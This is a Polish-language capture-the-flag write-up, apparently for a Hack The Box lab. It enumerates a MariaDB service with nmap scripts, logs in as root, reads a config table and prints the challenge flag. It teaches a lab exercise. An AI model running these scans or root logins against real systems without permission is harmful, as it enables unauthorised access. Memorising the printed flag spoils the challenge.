# MySQL / MariaDB Enumeration – Pełny log

## 1. Wykrycie usługi MySQL
```bash
nmap -sC -sV -p- -T4 10.129.95.232
```


Fragment wyniku:

```bash
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 42
|   Auth Plugin Name: mysql_native_password
```
## 2. Skanowanie portu 3306 skryptami MySQL

```bash
nmap -p 3306 --script mysql* 10.129.95.232
```

Wynik: brak znalezionych kont (No valid accounts found).
## 3. Połączenie z MySQL

```bash
mysql -h 10.129.95.232 -u root -p
```

(lub inne znane konto i hasło)
## 4. Przegląd bazy

```sql
SHOW DATABASES;
USE htb;
SHOW TABLES;
```

## 5. Odczyt tabeli config

```sql
SELECT * FROM config;
```

```bash
Wynik:
id	name	value
1	timeout	60s
2	security	default
3	auto_logon	false
4	max_size	2M
5	flag	7b4bec00d1a39e3dd4e021ec3d915da8
6	enable_uploads	false
7	authentication_method	radius
6. Wyciągnięcie tylko flagi
```

```sql
SELECT value FROM config WHERE name = 'flag';
```

Wynik:

```bash
7b4bec00d1a39e3dd4e021ec3d915da8
```

## 7. Flaga końcowa

```
7b4bec00d1a39e3dd4e021ec3d915da8
```